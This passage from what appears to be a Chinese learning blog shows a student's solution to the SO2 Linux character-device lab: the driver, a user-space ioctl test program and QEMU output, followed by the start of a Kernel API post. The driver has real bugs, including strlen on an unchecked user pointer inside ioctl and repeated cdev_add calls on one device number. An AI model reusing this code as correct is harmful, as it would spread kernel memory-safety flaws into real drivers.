设置没有open的字符设备的&quot;data-&gt;access&quot;为&#x27;0&#x27;,</span></span><br><span class="line"><span class="comment">    初始化时,所有的&quot;data-&gt;access&quot;都为&#x27;0&#x27;,表明所有字符设备都没有open过</span></span><br><span class="line"><span class="comment">    如果一个进程尝试open一个&quot;data-&gt;access&quot;为&#x27;1&#x27;的&#x27;/dev/so2_cdev&#x27;字符设备,就不会立刻返回,而是执行后面的语句并睡眠</span></span><br><span class="line"><span class="comment">    (so2_device_data也属于临界区,如果两个进程open同一个字符设备就可能有安全问题)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">if</span>(!atomic_cmpxchg(&amp;data-&gt;access,<span class="number">0</span>,<span class="number">1</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">	schedule_timeout(<span class="number">10</span> * HZ);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">so2_cdev_release</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 2: print message when the device file is closed. */</span></span><br><span class="line">	printk(<span class="string">&quot;message:%s&quot;</span>,MESSAGE);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> EXTRA</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> *<span class="title">data</span> =</span></span><br><span class="line">		(struct so2_device_data *) file-&gt;private_data;</span><br><span class="line">	<span class="comment">/* TODO 3: reset access variable to 0, use atomic_set */</span></span><br><span class="line">	atomic_set(&amp;data-&gt;access,<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">so2_cdev_read</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> *<span class="title">data</span> =</span></span><br><span class="line">		(struct so2_device_data *) file-&gt;private_data;</span><br><span class="line">	<span class="keyword">size_t</span> to_read;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> EXTRA</span></span><br><span class="line">	<span class="comment">/* TODO 7: extra tasks for home */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 4: Copy data-&gt;buffer to user_buffer, use copy_to_user */</span></span><br><span class="line">	to_read = min(BUFSIZ-*offset,size);</span><br><span class="line">	<span class="keyword">if</span>(copy_to_user(user_buffer,data-&gt;buffer+*offset,to_read))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	*offset += to_read;</span><br><span class="line">	<span class="keyword">return</span> to_read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">so2_cdev_write</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">const</span> <span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> *<span class="title">data</span> =</span></span><br><span class="line">		(struct so2_device_data *) file-&gt;private_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 5: copy user_buffer to data-&gt;buffer, use copy_from_user */</span></span><br><span class="line">	<span class="keyword">size_t</span> to_write = min(BUFSIZ-*offset,size);</span><br><span class="line">	<span class="keyword">if</span>(copy_from_user(data-&gt;buffer+*offset,user_buffer,to_write))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	*offset += to_write;</span><br><span class="line">	<span class="comment">/* TODO 7: extra tasks for home */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">so2_cdev_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> *<span class="title">data</span> =</span></span><br><span class="line">		(struct so2_device_data *) file-&gt;private_data;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> remains;</span><br><span class="line">	printk(<span class="string">&quot;ioctl start&quot;</span>);</span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="comment">/* TODO 6: if cmd = MY_IOCTL_PRINT, display IOCTL_MESSAGE */</span></span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_PRINT:</span><br><span class="line">		printk(<span class="string">&quot;%s&quot;</span>,IOCTL_MESSAGE);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="comment">/* TODO 7: extra tasks, for home */</span></span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_SET_BUFFER:</span><br><span class="line">		<span class="keyword">if</span>(copy_from_user(data-&gt;buffer,(<span class="keyword">char</span> *)arg,<span class="built_in">strlen</span>(arg)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		printk(<span class="string">&quot;buffer from usr:%s&quot;</span>,data-&gt;buffer);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_GET_BUFFER:</span><br><span class="line">		<span class="keyword">if</span>(copy_to_user((<span class="keyword">char</span> *)arg,data-&gt;buffer,<span class="built_in">strlen</span>(data-&gt;buffer)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_DOWN:</span><br><span class="line">		wait_event(data-&gt;<span class="built_in">queue</span>,<span class="number">0</span>); <span class="comment">/* 这里有小迷,当前进程直接进入等待队列,程序卡死 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_UP:</span><br><span class="line">		wake_up(&amp;data-&gt;<span class="built_in">queue</span>); <span class="comment">/* 这里就更迷了,根本不能确定唤醒了那个进程 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		ret = -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">so2_fops</span> =</span> &#123;</span><br><span class="line">	.owner = THIS_MODULE,</span><br><span class="line"><span class="comment">/* TODO 2: add open and release functions */</span></span><br><span class="line">	.open = so2_cdev_open,</span><br><span class="line">	.release = so2_cdev_release,</span><br><span class="line"><span class="comment">/* TODO 4: add read function */</span></span><br><span class="line">	.read = so2_cdev_read,</span><br><span class="line"><span class="comment">/* TODO 5: add write function */</span></span><br><span class="line">	.write = so2_cdev_write,</span><br><span class="line"><span class="comment">/* TODO 6: add ioctl function */</span></span><br><span class="line">	.unlocked_ioctl = so2_cdev_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">so2_cdev_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: register char device region for MY_MAJOR and NUM_MINORS starting at MY_MINOR */</span></span><br><span class="line">	err = register_chrdev_region(MKDEV(MY_MAJOR, <span class="number">0</span>),NUM_MINORS,MODULE_NAME);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUM_MINORS; i++) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> EXTRA</span></span><br><span class="line">		<span class="comment">/* TODO 7: extra tasks, for home */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		<span class="comment">/* TODO 4: initialize buffer with MESSAGE string */</span></span><br><span class="line">		<span class="built_in">strcpy</span>(devs[i].buffer,MESSAGE);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		<span class="comment">/* TODO 7: extra tasks for home */</span></span><br><span class="line">		init_waitqueue_head(&amp;devs[i].<span class="built_in">queue</span>);</span><br><span class="line">		<span class="comment">/* TODO 3: set access variable to 0, use atomic_set */</span></span><br><span class="line">		atomic_set(&amp;devs[i].access,<span class="number">0</span>);</span><br><span class="line">		<span class="comment">/* TODO 2: init and add cdev to kernel core */</span></span><br><span class="line">		cdev_init(&amp;devs[i].cdev,&amp;so2_fops);</span><br><span class="line">		cdev_add(&amp;devs[i].cdev,MKDEV(MY_MAJOR,<span class="number">0</span>),NUM_MINORS);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">so2_cdev_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUM_MINORS; i++) &#123;</span><br><span class="line">		<span class="comment">/* TODO 2: delete cdev from kernel core */</span></span><br><span class="line">		cdev_del(&amp;devs[i].cdev);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: unregister char device region, for MY_MAJOR and NUM_MINORS starting at MY_MINOR */</span></span><br><span class="line">	unregister_chrdev_region(MKDEV(MY_MAJOR,<span class="number">0</span>),NUM_MINORS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(so2_cdev_init);</span><br><span class="line">module_exit(so2_cdev_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>在用户态执行的测试代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 Lab - Linux device drivers (#4)</span></span><br><span class="line"><span class="comment"> * User-space test file</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;../include/so2_cdev.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_PATH	<span class="meta-string">&quot;/dev/so2_cdev&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * prints error message and exits</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">error</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	perror(message);</span><br><span class="line">	<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * print use case</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *argv0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;options&gt;\n options:\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\tp - print\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\ts string - set buffer\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\tg - get buffer\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\td - down\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\tu - up\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\tn - open with O_NONBLOCK and read data\n&quot;</span>, argv0);</span><br><span class="line">	<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Sample run:</span></span><br><span class="line"><span class="comment"> *  ./so2_cdev_test p		; print ioctl message</span></span><br><span class="line"><span class="comment"> *  ./so2_cdev_test d		; wait on wait_queue</span></span><br><span class="line"><span class="comment"> *  ./so2_cdev_test u		; wait on wait_queue</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="keyword">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">		usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">1</span>)</span><br><span class="line">		usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	fd = open(DEVICE_PATH, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (argv[<span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:				<span class="comment">/* print */</span></span><br><span class="line">		<span class="keyword">if</span> (ioctl(fd, MY_IOCTL_PRINT, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:				<span class="comment">/* set buffer */</span></span><br><span class="line">		<span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">			usage(argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">		<span class="built_in">strncpy</span>(buffer, argv[<span class="number">2</span>], BUFFER_SIZE);</span><br><span class="line">		<span class="keyword">if</span> (ioctl(fd, MY_IOCTL_SET_BUFFER, buffer) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;g&#x27;</span>:				<span class="comment">/* get buffer */</span></span><br><span class="line">		<span class="keyword">if</span> (ioctl(fd, MY_IOCTL_GET_BUFFER, buffer) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line">		buffer[BUFFER_SIZE<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;IOCTL buffer contains %s\n&quot;</span>, buffer);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:				<span class="comment">/* down */</span></span><br><span class="line">		<span class="keyword">if</span> (ioctl(fd, MY_IOCTL_DOWN, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:				<span class="comment">/* up */</span></span><br><span class="line">		<span class="keyword">if</span> (ioctl(fd, MY_IOCTL_UP, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">		<span class="keyword">if</span> (fcntl(fd, F_SETFL, O_RDONLY | O_NONBLOCK) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (read(fd, buffer, BUFFER_SIZE) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">		&#125;</span><br><span class="line">		buffer[BUFFER_SIZE<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Device buffer contains %s\n&quot;</span>, buffer);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		error(<span class="string">&quot;Wrong parameter&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/device_drivers/kernel<span class="meta"># insmod so2_cdev.ko</span></span><br><span class="line">root@qemux86:~/skels/device_drivers<span class="meta"># mknod /dev/so2_cdev c 42 0   </span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/device_drivers# ./user/so2_cdev_test p                     </span><br><span class="line">message:hello                                                                   </span><br><span class="line">ioctl start                                                                     </span><br><span class="line">Hello ioctl                                                                     </span><br><span class="line">message:hello     </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/device_drivers# ./user/so2_cdev_test g                     </span><br><span class="line">message:hello                                                                   </span><br><span class="line">IOCTL buffer contains hello                                                     </span><br><span class="line">                                                                                </span><br><span class="line">ioctl start                                                                     </span><br><span class="line">message:hello                                                                   </span><br><span class="line">root@qemux86:~/skels/device_drivers# ./user/so2_cdev_test s yhellow             </span><br><span class="line">message:hello                                                                   </span><br><span class="line">ioctl start                                                                     </span><br><span class="line">buffer from usr:yhellow                                                         </span><br><span class="line">message:hello                                                                   </span><br><span class="line">root@qemux86:~/skels/device_drivers# ./user/so2_cdev_test g                     </span><br><span class="line">message:hello                                                                   </span><br><span class="line">IOCTL buffer contains yhellow                                                   </span><br><span class="line">ioctl start                                                                     </span><br><span class="line">message:hello   </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/device_drivers<span class="meta"># cat /dev/so2_cdev                          </span></span><br><span class="line">message:hello                                                                   </span><br><span class="line">hello                                                                           </span><br><span class="line">message:hello</span><br></pre></td></tr></table></figure>
<p>感觉在锁和等待队列这一块还不是很熟悉，还需要多写代码</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/12/Linux-Lab2-Kernel%20API/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/12/Linux-Lab2-Kernel%20API/" class="post-title-link" itemprop="url">Linux-Lab2-Kernel API</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-12 02:02:24 / Modified: 02:04:44" itemprop="dateCreated datePublished" datetime="2022-10-12T02:02:24+08:00">2022-10-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Kernel API</strong></p>
<ul>
<li>熟悉基本的 Linux kernel API</li>
<li>内存分配机制说明</li>
<li>locking 机制说明</li>
</ul>
<p>内核是一个独立的实体，不能使用用户空间中的库（甚至不能使用 libc）</p>
<p>总之，内核编程基于一个全新的独立API，无论我们指的是 POSIX 还是 ANSI-C，它都与用户空间 API 无关</p>
<p><strong>Accessing memory</strong></p>
<p>内核编程中的一个重要区别是如何访问和分配内存，由于内核编程非常接近物理机，因此内存管理有重要的规则</p>
<p>首先，它适用于几种类型的内存：</p>
<ul>
<li>物理内存</li>
<li>内核地址空间中的虚拟内存</li>
<li>进程地址空间的虚拟内存</li>
<li>驻留内存（那些被映射到进程虚拟内存空间的物理内存）</li>
</ul>
<p>对于驻留内存而言，进程虚拟地址和内核虚拟地址有不同的情况：</p>
<ul>
<li>进程的地址空间中的虚拟内存不能被视为驻留：<ul>
<li>page 可能被交换，或者由于需求分页机制而根本不存在于物理内存中</li>
</ul>
</li>
<li>内核地址空间中的内存可以驻留或不驻留：<ul>
<li>模块的数据段和代码段以及进程的内核堆栈都是驻留的</li>
<li>动态内存可能是驻留的，也可能不是驻留的，具体取决于它的分配方式</li>
</ul>
</li>
<li>使用驻留内存时，事情很简单，因为可以随时访问驻留内存</li>
<li>如果使用非驻留内存，则只能从某些上下文中访问它</li>
<li>因此，当操作系统检测到此类访问时，它将采取严厉措施（阻止或重置系统以防止严重损坏）</li>
</ul>
<p>进程的虚拟内存通常不能直接从内核访问，但在某些情况下，设备驱动程序需要执行此操作：</p>
<ul>
<li>典型情况是设备驱动程序需要从用户空间访问缓冲区</li>
<li>在这种情况下，设备驱动程序必须使用特殊功能，并且不能直接访问缓冲区</li>
<li>这是防止访问无效内存区域所必需的</li>
</ul>
<p>相对于用户空间调度，内核的另一个区别是栈：</p>
<ul>
<li>栈的大小是固定且有限的（在 Linux 中使用 4K 堆栈，在视窗中使用 12K 堆栈）</li>
<li>因此，应避免在堆栈上分配大型结构或使用递归调用</li>
</ul>
<p><strong>Contexts of execution</strong></p>
<p>关于内核执行，我们区分两个上下文：</p>
<ul>
<li>进程上下文：<ul>
